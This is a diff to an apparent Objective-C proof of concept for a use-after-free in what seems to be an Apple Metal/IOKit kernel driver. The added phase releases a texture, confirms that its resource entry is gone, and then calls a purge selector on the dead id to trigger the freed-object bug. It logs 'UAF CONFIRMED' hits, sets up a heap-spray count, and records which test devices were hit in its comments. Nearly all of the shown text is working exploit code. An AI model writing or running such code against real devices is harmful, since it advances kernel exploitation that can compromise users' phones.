@@ -21,7 +21,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P065_BUILD @"p065-facet-a-oracle-v3"
+#define P065_BUILD @"p065-facet-a-oracle-v4"
 #define P065_SEL_PURGE 3
 #define P065_UAF_KR ((kern_return_t)0xe00002be)
 #define P065_SPRAY_N 0x300
@@ -281,7 +281,35 @@ static id<MTLTexture> p065_tex(id<MTLDevice> dev, uint32_t w, uint32_t h) {
     NSAssertionHandler *prev = [NSThread currentThread].threadDictionary[@"NSAssertionHandlerKey"];
     [NSThread currentThread].threadDictionary[@"NSAssertionHandlerKey"] = [P065AssertSwallow new];
 
-    uint32_t hits = 0;
+    /* v4 DIRECT-STALE phase (2026-10-20 20:2x triple-census lesson: the
+       census oracle now works on all devices (0x7423/hunt, 0x9b43/twin,
+       0x750f/17PM) but slot ids RECYCLE — the 17PM's 1x65535 new entry id 142
+       got re-taken by the next plant, so the purge hit a LIVE resource
+       (kr=0x0), and on hunt/twin Metal validation rejects 1x65535 outright.
+       Skip the overflow gamble: free the census texture, verify the entry
+       dies (2c2), then purge the DEAD id — the 64788 UAF in one call. */
+    uint32_t hits = 0;   /* direct-stale + plant hits both feed the VERDICT */
+    {
+        kern_return_t krDead = g_trap2(conn, P065_SEL_PURGE, censusId, 1);
+        p065_log(@"[v4] pre-kill purge(id=%u,state=1) kr=0x%x (live)", censusId, (unsigned)krDead);
+        legit = nil;          /* release the census texture */
+        g_seedTex = nil;
+        g_seedBuf = nil;
+        usleep(200000);
+        kern_return_t krCheck = g_trap2(conn, P065_SEL_PURGE, censusId, 1);
+        p065_log(@"[v4] post-kill purge(dead id) kr=0x%x — 2c2 = entry really died", (unsigned)krCheck);
+        if (krCheck == P065_UAF_KR) {
+            hits++;   /* dead-id purge already reporting NoResources */
+        }
+        for (int st = 5; st <= 6; st++) {
+            kern_return_t krU = g_trap2(conn, P065_SEL_PURGE, censusId, st);
+            p065_log(@"[v4] DIRECT-STALE purge(dead id=%u, state=%d) kr=0x%x "
+                     "(0xe00002be = UAF CONFIRMED)", censusId, st, (unsigned)krU);
+            if (krU == P065_UAF_KR) hits++;
+        }
+        p065_log(@"[v4] direct-stale phase done, hits=%u", hits);
+    }
+
     for (int it = 0; it < 2; it++) {
         p065_log(@"=== plant %d/2 ===", it + 1);
         NSSet *prePlant = p065_liveIds(conn);
